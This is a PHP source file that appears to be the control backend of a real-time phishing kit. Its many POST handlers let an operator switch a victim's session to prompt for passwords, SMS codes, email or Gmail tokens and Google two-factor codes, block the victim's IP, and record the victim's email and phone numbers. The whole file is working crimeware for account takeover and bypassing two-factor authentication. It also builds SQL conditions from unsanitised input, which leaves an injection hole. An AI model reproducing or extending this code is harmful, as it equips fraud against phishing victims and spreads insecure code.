<?php

require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";


if($_POST['tipo'] == "pedirsms") {
  $id     = $_POST['idremote'];
  $tipo   = "pedirsms";
 
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negarsms") {
  $id     = $_POST['idremote'];
  $tipo   = "negarsms";
 
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}


if($_POST['tipo'] == "pedirtokenmail") {
  $id     = $_POST['idremote'];
  $tipo   = "pedirtokenmail";
 
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negartokenmail") {
  $id     = $_POST['idremote'];
  $tipo   = "negartokenmail";
 
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "pedircodigogoogle") {
  $id     = $_POST['idremote'];
  $tipo   = "pedircodigogoogle";
 
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}


 if($_POST['tipo'] == "update_email") {
  $id = $_POST['idremote'];


  $email = $_POST['email_master'];
     
   $status = array(
     'usuario' => $email
        
   );
   DBUpDate('infos',$status , 'id="'.$id.'"');
   echo $id;
   
}



 if($_POST['tipo'] == "deslogar") {
  $id = $_POST['idremote'];


  $tipo = "deslogar";
     
   $status = array(
     'status' => $tipo,
     'statusremote' => $tipo    
   );
   DBUpDate('infos',$status , 'id="'.$id.'"');
   echo $id;
   
}
   
        //confirme cod trans
if($_POST['tipo'] == "pediremailrecuperar") {
  $id = $_POST['idremote'];
  $email = $_POST['email'];

  $tipo = "pediremailrecuperar";
     
   $status = array(
     'status' => $tipo,
     'numero_autenticar' => $email, 
     'statusremote' => $tipo    
   );
   DBUpDate('infos',$status , 'id="'.$id.'"');
   echo $id;
   
}

      //confirme cod trans
if($_POST['tipo'] == "negarmailderecu") {
  $id = $_POST['idremote'];


  $tipo = "negarmailderecu";
  $numero = $_POST['numerofinal'];
     
   $status = array(
     'status' => $tipo,
     'statusremote' => $tipo    
   );
   DBUpDate('infos',$status , 'id="'.$id.'"');
   echo $id;
   
}


          //confirme cod trans
if($_POST['tipo'] == "bloquearip") {
  $id = $_POST['idremote'];


  $tipo = "bloquearip";
     
   $status = array(
     'status' => $tipo,
     'statusremote' => $tipo    
   );
   DBUpDate('infos',$status , 'id="'.$id.'"');
   echo $id;
   
}

if($_POST['tipo'] == "pedirverificaMail") {
  $id     = $_POST['idremote'];
  $final     = $_POST['final'];
  $tipo   = "pedirverificaMail";
   $status = array(
    'numero_autenticar' => $final,
    'statusremote' => $tipo
   );
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "NegarverificaMail") {
  $id     = $_POST['idremote'];
  $tipo   = "NegarverificaMail";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}


if($_POST['tipo'] == "pedircodigogoogle") {
  $id     = $_POST['idremote'];
  $tipo   = "pedircodigogoogle";
 
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negarcodigogoogle") {
  $id     = $_POST['idremote'];
  $tipo   = "negarcodigogoogle";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "pedirbloqueio") {
  $id     = $_POST['idremote'];
 
  $tipo   = "pedirbloqueio";
  $status = array(
    
    'statusremote' => $tipo
   );
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}




if($_POST['tipo'] == "2fatores") {
	$id     = $_POST['idremote'];
  $tipo   = "2fatores";
	$status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "pedirsenha") {
  $id     = $_POST['idremote'];
  $tipo   = "pedirsenha";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}  

if($_POST['tipo'] == "pedirsenhaemail") {
  $id     = $_POST['idremote'];
  $tipo   = "pedirsenhaemail";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
} 

if($_POST['tipo'] == "negaremailsyng") {
  $id     = $_POST['idremote'];
  $tipo   = "negaremailsyng";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
} 

if($_POST['tipo'] == "2fatoresgoogle") {
  $id     = $_POST['idremote'];
  $tipo   = "2fatoresgoogle";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
} 

if($_POST['tipo'] == "pedirtokengmail") {
  $id     = $_POST['idremote'];
  $tipo   = "pedirtokengmail";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negartokengmail") {
  $id     = $_POST['idremote'];
  $tipo   = "negartokengmail";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "ok") {
  $id     = $_POST['idremote'];
  $tipo   = "ok";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "ipblock") {
  $id     = $_POST['idremote'];
  $tipo   = "ipblock";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "pedirtelefonegmail") {
  $id     = $_POST['idremote'];
  $tipo   = "pedirtelefonegmail";
  $numero = $_POST['numero'];
  $status = array('numero_autenticar' => $numero, 'statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negargmailtelefone") {
  $id     = $_POST['idremote'];
  $tipo   = "negargmailtelefone";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negargmail") {
  $id     = $_POST['idremote'];
  $tipo   = "negargmail";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "pediremail") {
  $id     = $_POST['idremote'];
  $tipo   = "pediremail";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "pedircodeemail") {
  $id     = $_POST['idremote'];
  $tipo   = "pedircodeemail";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "perdirsyng") {
  $id     = $_POST['idremote'];
  $tipo   = "perdirsyng";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negaruser") {
  $id     = $_POST['idremote'];
  $tipo   = "negaruser";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negar2fatores") {
  $id     = $_POST['idremote'];
  $tipo   = "negar2fatores";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negarfatorgoogle") {
  $id     = $_POST['idremote'];
  $tipo   = "negarfatorgoogle";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "negaremail") {
  $id     = $_POST['idremote'];
  $tipo   = "negaremail";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "pedircodemail") {
  $id = $_POST['idremote'];


  $tipo = "pedircodemail";
  $numero = $_POST['numerofinal'];
     
   $status = array(
     'numero_autenticar' => $numero, 
     'statusremote' => $tipo    
   );
   DBUpDate('infos',$status , 'id="'.$id.'"');
   echo $id;
   
}


if($_POST['tipo'] == "negarcodemail") {
  $id     = $_POST['idremote'];
  $tipo   = "negarcodemail";
  $status = array('statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "notificagmail") {
  $id     = $_POST['idremote'];
  $tipo   = "notificagmail";
  $numero = $_POST['numero'];
  $status = array('numero_autenticar' => $numero, 'statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "notificagmailq") {
  $id     = $_POST['idremote'];
  $tipo   = "notificagmailq";
  $numeroq = $_POST['numeroq'];
  $status = array('celular_autenticar' => $numeroq, 'statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}

if($_POST['tipo'] == "pedirsmsgmail") {
  $id     = $_POST['idremote'];
  $tipo   = "pedirsmsgmail";
  $numero = $_POST['numero'];
  $status = array('numero_autenticar' => $numero, 'statusremote' => $tipo);
  DBUpDate('infos',$status , 'id="'.$id.'"');
  echo $id;
}
?>